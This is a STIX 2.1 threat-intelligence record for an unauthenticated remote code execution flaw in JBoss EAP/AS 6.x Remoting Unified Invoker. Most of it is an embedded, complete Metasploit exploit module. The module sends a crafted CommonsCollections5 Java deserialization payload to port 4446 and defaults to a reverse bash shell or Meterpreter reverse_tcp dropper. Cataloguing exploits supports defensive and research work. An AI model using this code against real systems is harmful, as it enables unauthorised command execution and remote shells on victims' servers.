{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--95c6797b-165b-4724-ad41-b3c248ae23e0",
    "created": "2024-08-14T17:06:52.9656Z",
    "modified": "2024-08-14T17:06:52.965604Z",
    "name": "JBOSS EAP/AS Remoting Unified Invoker RCE",
    "description": " An unauthenticated attacker with network access to the JBOSS EAP/AS <= 6.x Remoting Unified Invoker interface can send a serialized object to the interface to execute code on vulnerable hosts. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/jboss_remoting_unified_invoker_rce.rb",
            "external_id": "jboss_remoting_unified_invoker_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://s3.amazonaws.com/files.joaomatosf.com/slides/alligator_slides.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::JavaDeserialization\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'JBOSS EAP/AS Remoting Unified Invoker RCE',\n        'Description' => %q{\n          An unauthenticated attacker with network access to the JBOSS\n          EAP/AS <= 6.x Remoting Unified Invoker interface can send a\n          serialized object to the interface to execute code on vulnerable hosts.\n        },\n        'Author' => [\n          'Joao Matos <@joaomatosf>',         # Discovery\n          'Marcio Almeida <@marcioalm>',      # PoC\n          'Heyder Andrade <@HeyderAndrade>'   # msf module\n        ],\n        'References' => [\n          [ 'URL', 'https://s3.amazonaws.com/files.joaomatosf.com/slides/alligator_slides.pdf']\n        ],\n        'DisclosureDate' => '2019-12-11',\n        'License' => MSF_LICENSE,\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_bash'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper,\n              'CmdStagerFlavor' => [ 'printf' ],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n    register_options([\n      Opt::RPORT(4446)\n    ])\n  end\n\n  def handshake_data\n    # MAGIC BYTES JAVA SERIALIZATION OBJECT HEADER\n    # AC ED: STREAM_MAGIC. Specifies that this is a serialization protocol.\n    # 00 05: STREAM_VERSION. The serialization version.\n    ['aced0005'].pack('H*')\n  end\n\n  def check\n    connect\n    sock.put(handshake_data)\n    data = sock.get_once(16)\n    disconnect\n    return Exploit::CheckCode::Appears if data == handshake_data\n\n    return Exploit::CheckCode::Safe\n  rescue Rex::ConnectionError, Errno::ECONNRESET, ::EOFError => e\n    print_error(\"Error to connect #{rhost}:#{rport} : '#{e.class}' '#{e}'\")\n    return Exploit::CheckCode::Unknown\n  end\n\n  # def exploit\n  def execute_command(cmd, _opts = {})\n    java_payload = generate_java_deserialization_for_command('CommonsCollections5', 'bash', cmd)\n    # MAGIC BYTES JBOSS PROTOCOL:\n    # 0x77: TC_BLOCKDATA\n    # 0x01: Length of TC_BLOCKDATA\n    # 0x16: Protocol version 22\n    # 0x79: TC_RESET\n    magic_bytes = ['77011679'].pack('H*')\n    payload = magic_bytes + java_payload.byteslice(4..)\n    connect\n    sock.put(handshake_data)\n    sock.get_once(16)\n    sock.put(payload)\n    disconnect\n    print_good('Successfully sent payload')\n  rescue Rex::ConnectionError, Errno::ECONNRESET, ::EOFError => e\n    fail_with(Failure::Unreachable, e.message)\n  end\n\n  def exploit\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager\n    end\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2019-12-11",
    "x_mitre_platforms": [
        "linux'"
    ]
}